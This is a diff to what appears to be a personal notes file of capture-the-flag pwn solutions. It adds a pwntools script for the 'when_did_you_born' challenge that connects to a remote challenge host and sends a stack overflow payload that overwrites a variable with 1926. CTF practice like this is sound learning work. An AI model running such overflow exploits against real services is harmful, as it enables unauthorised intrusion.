@@ -17,7 +17,24 @@ p.sendline(pay)
 p.interactive()
 ```
 
-# 
+# when_did_you_born
+
+```python
+from pwn import *
+p=remote('111.198.29.45',38206)
+pay1='1999'
+pay2='a'*8+p64(1926)
+p.recvuntil('?')
+p.sendline(pay1)
+p.recvuntil('?')
+p.sendline(pay2)
+p.interactive()
+```
+
+# CGfsb
+
+```python
+
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTUxMzUwMTE0MF19
+eyJoaXN0b3J5IjpbOTM2MTIyNzM0XX0=
 -->
